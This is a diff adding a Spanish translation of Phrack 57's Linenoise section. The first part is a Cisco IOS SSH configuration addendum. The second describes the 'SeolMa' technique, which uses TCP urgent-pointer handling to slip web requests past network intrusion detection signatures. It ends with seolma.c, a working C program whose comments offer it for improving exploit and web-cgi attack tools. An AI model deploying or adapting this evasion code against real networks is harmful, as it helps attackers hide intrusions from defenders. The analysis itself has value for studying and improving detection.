@@ -1,0 +1,468 @@
+                            ==Phrack Inc.==
+
+             Volumen 0x0b, Numero 0x39, Archivo #0x03 de 0x12
+
+|=-----------------------=[ L I N E N O I S E ]=-------------------------=|
+|=-----------------------------------------------------------------------=|
+|=--------------------------=[ phrackstaff ]=----------------------------=|
+
+
+
+|=[ 0x00 ]=--------------------------------------------------------------=|
+
+En Phrack Volumen 0xa Numero 0x38, la seccion Linenoise decia "Phrack
+Linenoise is a hodge-podge" y ahi habia una "seccion en Linenoise
+especificamente para correcciones y agregados a articulos previos".
+
+Entonces, dijimos, que mierda, publiquemos un Addendum al articulo
+"Building Bastion Routers Using Cisco IOS" en Phrack Numero 55-10.
+
+Cuando escribimos primero este articulo, que tenia 2 a~os, el soporte
+para SSH en IOS era muy nuevo y solo para los routers series 7xxx y
+12xxx y solo en la ultima version 12.0. Fuimos justos y no lo incluimos
+e indicamos que fue inminente. Bueno, todo el mundo nos mando un
+e-mail diciendo "hey, IOS tiene SSH ahora". Gracias, lo sabemos.
+
+Con la version 12.1(1)T, el soporte para SSH esta ahora disponible en
+la mayoria de las plataformas. Pero, puedes necesitar actualizar la flash
+o la DRAM para usarlo. De acuerdo con el sitio web de Cisco:
+
+    "Antes de configurar la caracteristica SSH del servidor, debes tener
+    una imagen de software de encriptacion IPsec...."
+
+Esto basicamente significa que probablemente necesitaras un minimo de 16MB
+de flash y probablemente cerca de 32MB de DRAM. Y asegurate de que
+bajaste la version 3DES para no adormecerte en ese falso sentido de
+seguridad que ofrece la llave-simple DES.
+
+Deberiamos tambien notar que IOS (y PIX para eso) solo soportan la version 1
+del protocolo SSH, en un momento en que la mayoria de la comunidad de
+seguridad se esta mudando a la version 2 del protocolo, ahora esas
+implementaciones (p.e., OpenSSH) libres estan disponibles con soporte para
+el protocolo 2. Las palabras que hemos escuchado de Cisco es que no tienen
+planes para soporte del protocolo SSH version 2, recomiendan que uses
+IPsec en su lugar.
+
+Una razon especifica de que Cisco deberia soportar el protocolo 2 es que
+hay debilidades conocidas en el protocolo 1. Ciertamente, estas
+debilidades han sido conocidas por mas de un a~o y Cisco finalmente
+reconocio que su implementacion fue vulnerable tambien. Ellos desarrollaron
+un boletin de seguridad en Junio y el resumen lo dice todo:
+
+    "Tres diferentes lineas de productos Cisco son suceptibles a multiples
+    vulnerabilidades en el protocolo Secure Shell (SSH). Estas son
+    inherentes al protocolo SSH 1.5, que esta implementado en varias
+    lineas de productos Cisco."
+
+Entonces ahora vayamos a negociar y te mostraremos como configurarlo.
+La implementacion SSH de Cisco requiere que el sistema tenga un
+hostname y un nombre de dominio, por lo que empezaremos con eso:
+
+1. Configurar un hostname:
+
+   filter(config)#hostname filter
+
+2. Configurar un nombre de dominio:
+
+   filter(config)#ip domain-name home.net
+
+3. Generar una llave RSA especifica para el host. Usar al menos una
+   llave de 1024 bits.
+
+   filter(config)#crypto key generate rsa
+
+   El nombre para las llaves sera: filter.home.net
+   Elige el tama~o del modulo de llave en el rango de 360 o 2048 para
+   tus Llaves de Proposito General. Eligiendo un modulo de llave mayor
+   a 512 puede tomar un par de minutos.
+
+   Cuantos bits en el modulo [512]: 1024
+   Generating RSA keys ...
+   [OK]
+
+Ahora, actua inteligentemente y asegurate de que el acceso TELNET esta
+desactivado y luego guarda la configuracion:
+
+   filter(config)#line vty 0 15
+   filter(config-line)#transport input none
+   filter(config-line)#transport input ssh
+   filter(config-line)#exit
+   filter(config)#exit
+   filter#write
+   Building configuration...
+   [OK]
+
+4. Ahora puedes ver las llaves:
+
+   filter#sh crypto key mypubkey rsa
+   % Key pair was generated at: 14:41:28 PDT Jun 19 2000
+   Key name: filter.home.net           
+   Usage: General Purpose Key
+   Key Data:
+    30819F30 0D06092A 864886F7 0D010101 05000381 8D003081 89028181 00B3F24F
+    F51367B1 70460C52 B06E5110 F41A5458 EEE6A0DD 840EB3D3 44A958E9 E3BDF6BE
+    72AE2994 9751FFCB 127A5D20 318D945B FBC25FC5 D9E3BFED 8B9BBCA9 EC3A61B8
+    2BD6EC35 EA83CC56 27D08248 935A3F2A 9B941580 E69CC8B9 0C2CFA98 AD6F04CC
+    19BB8522 8E5907EA 6B047EF1 E5DBBE1C E2187761 2E106479 A4297932
+    19020301 0001  
+   % Key pair was generated at: 14:41:39 PDT Jun 19 2000
+   Key name: filter.home.net.server
+   Usage: Encryption Key 
+   Key Data:
+    307C300D 06092A86 4886F70D 01010105 00036B00 30680261 00CF13EE C84A2FE3
+    5720A5AB 5DA7B84D 2232E8E7 2589EF53 170BA42D 2830B2E0 44C2E60F 43BC06F2
+    9D52BC92 774B8442 99CD0F8F 7073F5C8 97C9A91B 14284981 D23808C0 EF71522E
+    CBBC87AB C1CCE95A 9813B13D D52BC0D0 DC4567A3 BA4C9F24 A1020301 0001
+
+La "Llave de Proposito General" es la llave del host y la "Llave de
+Encriptacion" es como la llave efimera del server, que parece ser 768 bits.
+
+5. Configurar el timeout y los re-intentos de autenticacion si se desea;
+   timeout por defecto es 120 segundos y el numero de re-intentos de
+   autenticacion es 3:
+
+   filter(config)#ip ssh time-out 60
+   filter(config)#ip ssh authentication-retries 2
+
+6. Configurar autenticacion:
+
+Hay varios proyectos diferentes de autenticacion que puedes usar incluyendo
+RADIUS y TACACS. Cubriremos solo dos de los proyectos mas simples aqui:
+
+   Opcion 1: Usa el password enable:
+
+   filter(config)#aaa new-model
+   filter(config)#aaa authentication login default enable
+
+   Opcion 2: Passwords locales:
+
+   filter(config)#aaa authentication login default local 
+   filter(config)#username beldridg password 0 junos
+   filter(config)#service password-encryption
+
+7. Testearlo:
+
+   [beldridg@anchor tmp]$ ssh 192.168.3.9
+   beldridg@192.168.3.9's password:
+   Warning: Remote host denied X11 forwarding.
+   Warning: Remote host denied authentication agent forwarding.
+
+   filter>sh ssh
+   Connection      Version Encryption      State                   Username
+    0              1.5     3DES            Session started         beldridg
+
+Los mensajes de error son normales si tu cliente SSH es configurado para
+solicitar X11 y forwardeo de agente de autenticacion. La razon para el
+mensaje de forwardeo X11 es que el sistema no tiene clientes X, y asi no
+se necesita para forwardeo X11. Tambien no soporta forwardeo de agente
+ya que la implementacion Cisco no soporta autenticacion RSA.
+
+Desafortunadamente, no hay mecanismo para configurar el servidor SSH para
+aceptar solo el cifrado 3DES. Una solicitud de mejora fue archivada con
+Cisco alrededor de 1 a~o y no escuchamos de nuevo el estado de nuestro
+pedido. Esto significa que los clientes SSH paralizados, o clientes
+que solicitan DES, pueden seguir conectandose al servidor:
+
+   [variablek@anchor variablek]$ ssh -c des 192.168.3.9
+   Warning: use of DES is strongly discouraged due to cryptographic weaknesses
+   variablek@192.168.3.9's password: 
+   Warning: Remote host denied X11 forwarding.
+   Warning: Remote host denied authentication agent forwarding.
+
+   filter>sh ssh
+   Connection      Version Encryption      State                   Username
+    0              1.5     DES             Session started         variablek
+
+8. Cliente SSH 
+
+Con la version 12.1(3)T, ISO tambien tiene un cliente SSH (soporta DES
+y 3DES) por lo que puedes iniciar conexiones outbound con algo
+como lo siguiente:
+
+   filter#ssh -l beldridg 10.0.0.1
+
+Las versiones mas nuevas de IOS proveen la capacidad de copiar
+configuraciones hacia y desde servidores SSH via scp aunque no hemos
+jugado con eso todavia.
+
+|=[ 0x01 ]=--------------------------------------------------------------=|
+
+Asunto:  El Metodo de Evasion de NIDS llamado "SeolMa"
+
+Recientemente, una nueva propiedad unica de TCP ha sido conocida por
+algunos simples tests. Esta propiedad fue encontrada cuando ponemos
+data TCP Urgent en el medio de un stream de datos TCP normales, y puede
+ser usado de una forma para evitar la coincidencia de patron de la mayoria
+de los IDS, especialmente NIDS..
+
+Primeramente, lo peor es focalizarse en la discordancia del proceso
+de interpretacion entre la forma de los Sistemas Operativos comunes y
+la definicion del RFC 1122.  (No podemos cubrir el todo del modo TCP Urgent
+en este texto).
+La implementacion TCP/IP, derivo del Sistema BSD tradicional, el puntero
+Urgent en la cabecera TCP apunta a los datos justo despues de los ultimos
+datos Urgent. Pero el RFC dice que el Puntero Urgent deberia apuntar a los
+ultimos datos Urgent.
+
+Arriba de los dos Punteros Urgent diferentes el proceso de interpretacion
+hace dos resultados diferentes contra el test a continuacion.
+
+El testeo fue ejecutado como Apache y IIS, como una aplicacion,
+en Solaris ( 7,8 )  , Linux 2.2.14 y Windows 2000.
+Indudablemente, desde mi punto de vista, estas dos aplicaciones no tienen
+ninguna definicion especial para la comunicacion de datos Urgent.
+(p.e., estos pueden ser manejados de la misma forma que los datos generales
+de TCP.)
+
+En el primer test, el paquete string "ABC" fue enviado en modo plain, y
+luego el paquete string "DEF" fue forwardeado en modo Urgente.
+Finalmente el paquete string "GHI" fue entregado. El valor de Puntero
+Urgent en el paquete tcp "DEF" fue "3" .
+Despues de enviar este string, la composicion del string final en el host
+no fue la esperada "ABCDEFGHI",
+sino "ABCDEGHI", que estaba en el log de cada aplicacion, para nuestra
+sorpresa.
+El caracter "F" desaparecio.
+
+Durante el primer test anterior, el entorno de Linux sigue el formato de
+BSD para el procesamiento de datos Urgent.
+Por lo tanto la configuracion fue cambiada como en el RFC 1122 para
+el siguiente test.
+Esta configuracion puede ser consultada en la pagina MAN TCP.
+ex) echo "1" > /proc/sys/net/ipv4/tcp_stdurg
+
+En el segundo test, el proceso de interpretacion del Puntero Urgent de Linux
+sigue el RFC 1122.
+El mismo procedimiento fue aplicado a la transmision del paquete en el
+segundo test.
+El valor del Puntero Urgent en el paquete tcp "DEF" fue tambien "3".
+En este momento, el resultado no fue "ABCDEFGHI", sino "ABCDEFHI", para
+nuestra sorpresa.
+El Caracter "G" fallo en este test.
+
+>Desde la verificacion de la transmision del paquete usando TCPDUMP y
+los resultados anteriores, llegamos a la siguiente conclusion:
+
+"Datos de 1 Byte, siguientes a los datos Urgent, seran perdidos, cuando
+los datos Urgent y los datos normales sean combinados."
+
+Analizando el primer test, el valor del Puntero Urgent fue "3",
+cuando "DEF" fue enviado en modo Urgent.
+Sin embargo, el conteo de los Datos Urgent actuales se convierte en
+"3 - 1 = 2", debido al siguiente formato BSD, y solo  "DE" es considerado
+como Datos Urgent y el dato "F" de 1 Byte, despues de "DE", es perdido.
+
+Similarmente, el resultado del segundo test puede ser explicado.
+El valor Puntero Urgent "DEF" del paquete tcp fue 3.
+En este caso, todo "DEF" se convierte en Datos Urgent y siguiendo a "GHI"
+estan los datos normales.
+El caracter "G" es descartado, como dato de 1 Byte siguiento los Datos
+Urgent, de la misma forma.
+
+Es significante que el procesamiento BSD es aplicado a todos los
+procesamientos por defecto de los Sistemas Operativos en estos tests.
+
+Ahora, usando esta caracteristica, NIDS puede ser facilmente enga~ado
+porque no tiene consideracion para esto.
+Asume que uno quiera solicitar un "GET /test-cgi" URL.
+Entonces divide "test-cgi", que puede ser la firma de NIDS, en al menos
+3 partes.
+
+Dividamos en "test, "t-c" y "gi".
+Si "t-c" es enviado como dato Urgent, esta claro que el ultimo Byte "c"
+sera perdido y la ultima combinacion sera "test-gi".
+Asi uno puede agregar cualquier Byte en "t-c" para trucar.
+
+Forwardea como "tes", "t-cX" y "gi" con la misma manera.
+Luego el Apache del host final o IIS reconocera como "test-cgi", pero
+el resultado de la composicion en NIDS sera "test-cXgi" sin consideracion
+de esto. No sorprende que uno pueda evitar la coincidencia de patron NIDS
+a traves de esto.
+Esto no es manejado aun en Snort,  Open-Source.
+El NIDS Comercial tambien no ve esto.
+
+Para peor, el SO como la version 2.2.14 de Linux muestra diferente
+resultado por velocidad de transmision, cuando los datos Urgent son
+enviados mas de tres veces.
+Esto puede deteriorar el camino protector de NIDS.
+Eso es, solo la prediccion de perder 1 Byte no es la solucion.
+
+Por ejemplo, enviando "ab" en normal, "cd" en modo Urgent, "ef" en normal,
+"gh" tambien en modo Urgent, "ij" en normal, y finalmente "kl" en modo
+Urgent, puede resultar en "abcefgijk" por la teoria previa en este texto.
+Sin embargo, el resultado actual es "abcdefghijk" y los datos Urgent
+finales pueden seguir la propiedad previa.
+Para la comprension completa de la propiedad previa de los datos Urgent,
+cada transmision de datos necesita un descanso entre medio.
+
+Para mas detalles, puede consultarse el siguiente codigo "seolma.c".
+
+El siguiente codigo mostrara el concepto simple de esto.
+
+Doy el nombre de "SeolMa" para este metodo.
+
+
+Agradecimiento:  Gracias a los otros miembros del RealAttack Team
+(www.realattack.com)
+                  Yoon , Young  ( yoon0258@www.a3sc.co.kr )
+                  Oh, Jae Yong  (syndcate@orgio.net )
+                  Yoon, Young Min (scipio21@yahoo.co.kr)
+
+|=[ SeolMa.c ]=----------------------------------------------------------=|
+
+/*  Este es un simple codigo fuente solo para prueba.
+    Puedes mejorar tu codigo exploit observandolo
+    Compilado y Testeado en Linux 2.2.X
+    Funciona bien contra la mayoria de los Apache , IIS .
+    Mejora tu scan, herramienta de ataque web-cgi
+
+   Escrito por : YoungJun Ko,  ohojang@realattack.com  
+                 Sungjun Ko, Minsook Ko
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <fcntl.h>
+
+#define TCP_PORT 80
+#define SOL_TCP 6
+#define TCP_NODELAY  1
+#define TARGET_IP "1.2.3.4"
+
+/* contador <  Largo de la Firma de NIDS - 1
+    Por ejemplo,  Contra "test-cgi "
+    deberia ser contador < 7   */
+
+int counter=0;
+
+/* writen() es un punto importante en este codigo fuente...
+    Ajuste el codigo de Stevens */
+
+int writen(fd, ptr, nbytes ,sockfd,origin)
+register int fd;
+register char *ptr;
+register int nbytes;
+int sockfd;
+char *origin;
+{
+       int nleft, nwritten ;
+       int i, k;
+       char urgent[2];
+       int done =0;
+       int all =0;
+
+       nleft= nbytes;
+
+            while( nleft > 0 ) {
+              nwritten = write(fd , ptr, counter );
+              if ( nwritten  <= 0 )
+                   {
+                    printf("Write Error \n" );
+                    return (nwritten);
+                   }
+
+              nleft -=  nwritten ;
+              ptr += nwritten;
+
+       all += nwritten;
+
+  /* Para algun Linux, debemos dormir . */
+     sleep(2);
+  /* 4 veces insercion es suficiente para evasion de IDS en casos simples */
+   if (  done != 4  )
+        {
+        for (k=1 ; k <=1 ; k++ )
+   {
+        urgent[0]= *ptr;
+        urgent[1]= 'X';
+        urgent[2]= '\0';
+        
+        i = send( fd, urgent , strlen(urgent), MSG_OOB ) ;
+        printf("send result is %d\n" , i );
+   }
+        done  +=1;
+         ptr += 1;
+          }
+
+  }
+           return(nbytes - nleft );
+}
+
+
+int
+main(int argc, char *argv[])
+{
+    int sockfd;
+    int i,j,k,sendbuff;
+    socklen_t optlen;
+    struct sockaddr_in serv_addr;
+    char buffer[2048];
+    char recvbuffer[2048];
+    bzero( (char *)&serv_addr , sizeof(serv_addr) );
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_addr.s_addr = inet_addr(TARGET_IP );
+    serv_addr.sin_port = htons ( TCP_PORT  );
+    counter = atoi(argv[2]);
+    if ( counter == 0 )
+    {
+       printf("You must input counter value \n" );
+       exit(-1) ;
+    }
+    if ( (sockfd = socket( AF_INET , SOCK_STREAM , 0 )) < 0 )
+    {
+	       printf("Error socket \n");
+	       exit(-1);
+    }
+
+    sendbuff = 1;
+    optlen = sizeof(sendbuff );
+
+    i= setsockopt( sockfd,
+                   SOL_TCP,
+                   TCP_NODELAY,
+                   (char *)&sendbuff,
+                   optlen);
+    printf("setsockopt TCP_NODELAY value %d\n" , i );
+    if ( connect (sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr))<0)
+    {
+	  printf("Connect Failed \n");
+	  exit(-1);
+    }
+/* hacer tal archivo que contenga "GET /test-cgi  /HTTP 1.0\n\n"  */
+   i= open(argv[1], O_RDONLY );
+   j=read ( i, buffer , sizeof(buffer));
+   printf(" Read Buffer size is %d\n", j );
+
+   k= writen( sockfd , buffer, j, sockfd, buffer);
+   printf("I write on socket %d bytes \n", k );
+   sleep(1);
+/*
+ * Uso simplemente read() ... Generalmente da error ,
+ * Pero no te preocupes por eso
+ * Solo observa el log de tu servidor web. ( access_log  , ...   )
+ */
+   k = read ( sockfd, recvbuffer , sizeof(recvbuffer) );
+   printf(" I Read on socket %d bytes\n", k );
+   printf("%s\n", recvbuffer );
+
+  return 0;
+}
+
+ 
+ N. del T.: En Phrack 57, Archivo 0x03, tambien se incluye otro articulo:
+ 	    0x02 - "The Telecommunications Fraud Preventive Committee (TFPC)
+	    escrito por nemesystm, que no fue traducido aqui.
+
+
+ Traducido por Active Matrix - ActiveMatrix@technologist.com
+ Para RareGaZz - http://raregazz.cjb.net
+ Argentina, 2002
+ El articulo aqui traducido, mantiene los derechos de autor.
+
+
